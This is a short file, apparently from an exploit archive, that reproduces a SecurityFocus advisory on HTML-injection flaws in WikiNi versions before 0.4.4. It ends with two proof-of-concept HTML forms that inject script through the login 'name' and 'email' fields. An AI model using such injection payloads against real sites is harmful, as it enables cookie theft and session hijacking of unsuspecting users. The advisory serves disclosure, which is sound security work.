@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/20688/info
+
+WikiNi is prone to multiple HTML-injection vulnerabilities because it fails to sufficiently sanitize user-supplied input data before using it in dynamically generated content.
+
+An attacker may leverage these issues to have arbitrary script code execute in the browser of an unsuspecting user in the context of the affected site. This may allow an attacker to steal cookie-based authentication credentials, control how the site is rendered, and launch other attacks.
+
+WikiNi versions prior to 0.4.4 are vulnerable.
+
+<form method="POST" enctype="application/x-www-form-urlencoded" action="http://www.example.com/wakka.php"> <input type="hidden" name="wiki" value="ParametresUtilisateur"> <input type="hidden" name="action" value="login"> <input type="hidden" name="name" value=">"><script>alert('XSS Vulnerable');</script>" <input type="submit" value="Submit" name="submit"> </form> </body> </html> <html> <body> <form method="POST" enctype="application/x-www-form-urlencoded" action="http://www.example.com/wakka.php"> <input type="hidden" name="wiki" value="ParametresUtilisateur"> <input type="hidden" name="action" value="login"> <input type="hidden" name="email" value=">"><script>alert('XSS Vulnerable');</script>" <input type="submit" value="Submit" name="submit"> </form> </body> </html>
